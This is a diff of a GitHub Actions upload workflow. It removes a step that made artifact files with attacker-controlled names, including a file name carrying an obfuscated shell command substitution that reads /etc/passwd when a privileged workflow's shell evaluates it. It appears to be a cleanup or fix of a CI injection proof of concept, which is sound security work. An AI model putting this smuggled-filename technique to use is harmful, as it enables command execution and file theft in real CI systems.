@@ -9,28 +9,13 @@ permissions:
 jobs:
   upload:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      actions: write
     steps:
-      - name: build artifact with attacker-controlled names
+      - name: build artifact
         run: |
           set -e
           mkdir -p content
           printf 'plain report\n' > content/report.txt
-          printf 'sibling content\n' > content/pwn.txt
-          printf 'substituted target\n' > content/p2wn.txt
-          printf '%s\n' "$PR_NUMBER" > content/pr_number.txt
-          # the file NAME below is evaluated by the privileged workflow's shell
-          python3 - <<'PY'
-          name = ("p$(python3 -c 'import os;os.write(2,open(chr(47)+chr(101)+chr(116)"
-                  "+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100))"
-                  ".read().encode())'; echo 2)wn.txt")
-          open("content/" + name, "w").write("payload\n")
-          PY
           ls -1 content
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
       - uses: actions/upload-artifact@v4
         with:
           name: content
